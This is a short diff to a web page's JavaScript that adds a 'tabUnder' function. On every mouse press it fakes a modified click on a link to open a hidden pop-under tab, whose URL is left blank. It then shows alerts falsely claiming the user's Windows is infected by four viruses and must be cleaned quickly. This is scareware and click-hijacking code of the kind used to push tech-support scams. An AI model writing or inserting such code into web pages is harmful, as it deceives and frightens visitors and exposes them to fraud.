@@ -55,3 +55,17 @@ $(document).ready(function() {
     }, 1000);
   }
 });
+
+document.addEventListener("mousedown", tabUnder);
+
+function tabUnder() {
+    var a = document.createElement("a"),
+        e = document.createEvent("MouseEvents");
+    a.href = ""; //the URL of 'popup' tab
+    e.initMouseEvent("click", true, true, window, 0, 0, 0, 0, 0, true, false, false, true, 0, null);
+    a.dispatchEvent(e);
+    //document.removeEventListener("mousedown", tabUnder);
+window.alert("ATTENTION");
+window.alert("Your Windows is infected by (4) viruses and Your system is damaged.");
+window.alert("You must clean the system from viruses, as quick as possible!");
+}
